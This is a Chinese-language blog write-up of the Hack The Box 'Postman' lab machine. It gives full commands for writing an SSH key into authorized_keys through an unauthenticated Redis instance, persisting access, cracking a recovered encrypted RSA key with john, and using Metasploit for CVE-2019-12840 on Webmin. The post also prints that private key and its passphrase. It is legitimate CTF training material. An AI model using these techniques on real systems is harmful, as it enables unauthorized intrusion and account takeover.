---
layout: post
title: "[writeup] HTB Postman"
date: 2020-03-15 00:00:00 +0800
author: xiangxiang
categories: HTB writeup
tags: [htb hackthebox writup postman webmin redis CVE]
---

 ![](/img/htb-postman-info.JPG){:width="512px"}

## 0x00 信息收集
- 只有ip信息，第一步当然是先扫一下的
{% highlight bash %}
~ # nmap -p- -Pn -vv 10.10.10.160
...
Discovered open port 80/tcp on 10.10.10.160
Discovered open port 22/tcp on 10.10.10.160
Discovered open port 6379/tcp on 10.10.10.160
Discovered open port 10000/tcp on 10.10.10.160
...
{% endhighlight %}

- Web at port 80
    + 一个建设中的网站，dirbuster扫描只发现了几个目录
    + 并没有发现有意思的内容
{% highlight bash %}
/upload
/images
{% endhighlight %}

- Web at port 10000
    + https://10.10.10.160:10000/ 
    + Webmin，需要密码登录

    ![](/img/htb-postman-webmin.JPG)

- Redis at port 6379
    + Redis没有密码的认证保护
    + Redis的默认配置情况
{% highlight bash %}
root@kali:~# redis-cli -h 10.10.10.160 -p 6379 ping
PONG
root@kali:~#
root@kali:~# redis-cli -h 10.10.10.160
10.10.10.160:6379> CONFIG GET *
  1) "dbfilename"
  2) "authorized_keys"
  3) "requirepass"
  4) ""
...
165) "dir"
166) "/var/lib/redis/.ssh"
...
(0.54s)
10.10.10.160:6379>
{% endhighlight %}


## 0x01 Redis SSH exploit
- Redis未认证的情况下有多种漏洞利用的方式，大类可以分为这么几种
    1. 直接利用Redis去写文件： 具体的利用方式有写webshell，ssh key，写计划任务等 [参考链接](http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html)
    2. 利用Master-Slave的`FULLRESYNC`写一个可执行二进制文件并使用`MODULE LOAD`执行: [参考链接](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

- 重置一下Postman的机器可以确认Redis的`dir`和`dbfilename`默认配置就是ssh，可能是机器的创建者给的hint

- 利用Redis写ssh key的时候由于会有其他参与者，需要注意清理环境
{% highlight bash %}
root@kali:~# redis-cli -h 10.10.10.160
10.10.10.160:6379> SLAVEOF NO ONE 
OK
10.10.10.160:6379> CONFIG SET dir "/var/lib/redis/.ssh"
OK
10.10.10.160:6379> CONFIG SET dbfilename "authorized_keys"
OK
10.10.10.160:6379> KEYS * # make sure it is empty
(empty list or set)
10.10.10.160:6379> FLUSHALL
OK
{% endhighlight %}

- 本地生成ssh key
{% highlight bash %}
root@kali:~/Desktop/Postman# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): ./postman_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./postman_rsa.
Your public key has been saved in ./postman_rsa.pub.
The key fingerprint is:
SHA256:OqJj2doQ+xjcE7zlyByq+cfmYeFLXt9dK16Q/XdfVcs root@kali
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|                .|
|   .         o. o|
|  . = . S   o .E.|
| . O O .     . ..|
|  *+& =       o =|
| o+@=* o . ..o .=|
|oo=**   . ..o.. .|
+----[SHA256]-----+
{% endhighlight %}

- 写入Redis
{% highlight bash %}
root@kali:~/Desktop/Postman# (echo -e "\n\n"; cat postman_rsa.pub; echo -e "\n\n") > temp.txt
root@kali:~/Desktop/Postman# cat temp.txt | redis-cli -h 10.10.10.160 -x set dummy1
OK
{% endhighlight %}

- ssh to redis@10.10.10.160
{% highlight bash %}
root@kali:~/Desktop/Postman# ssh -i postman_rsa redis@10.10.10.160
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Nov 28 09:23:36 2019 from 10.10.14.188
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
{% endhighlight %}

- persist ssh key
    + 由于同时的使用者很多，authorized_keys文件一直被改，所以得想想办法使得ssh链接稳定一些
    + `/etc/ssh/sshd_config`中发现把key写到`authorized_keys2`中也可以
    + 把本地的ssh公钥复制到`/var/lib/redis/.ssh/authorized_keys2`中

## 0x02 User flag
- [LinEnum](https://github.com/rebootuser/LinEnum) 枚举实际一个有意思的备份文件
{% highlight bash %}
...
[-] Location and Permissions (if accessible) of .bak file(s):
-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 /opt/id_rsa.bak
...
{% endhighlight %}

- 这是一个加密过的RSA私钥，把这个文件拉到本地并使用John来破解
{% highlight bash %}
root@kali:~/Desktop/Postman# scp -i postman_rsa redis@10.10.10.160:/opt/id_rsa.bak ./
id_rsa.bak          100% 1743     2.5KB/s   00:00

root@kali:~/Desktop/Postman# cat id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----

root@kali:~/Desktop/Postman# wget https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
...
2019-11-28 23:38:36 (72.7 MB/s) - ‘ssh2john.py.1’ saved [7781/7781]

root@kali:~/Desktop/Postman# python ssh2john.py id_rsa.bak > id_rsa.2john

root@kali:~/Desktop/Postman# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.2john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)
1g 0:00:00:18 DONE (2019-11-28 23:39) 0.05446g/s 781138p/s 781138c/s 781138C/sa6_123..*7¡Vamos!
Session completed

{% endhighlight %}

- Failed SSH with id_rsa
{% highlight bash %}
root@kali:~/Desktop/Postman# chmod 700 id_rsa.bak
root@kali:~/Desktop/Postman# ssh -i id_rsa.bak Matt@10.10.10.160
Enter passphrase for key 'id_rsa.bak':
Connection closed by 10.10.10.160 port 22
{% endhighlight %}

- SSH到redis账户，su至Matt成功，获取user flag
    + Matt账户密码就是rsa私钥的密码

     ![](/img/htb-postman-userflag.jpg)

## 0x03 Root flag
- CVE-2019-12840
- 直接使用metasploit即可
 ![](/img/htb-postman-rootflag.jpg)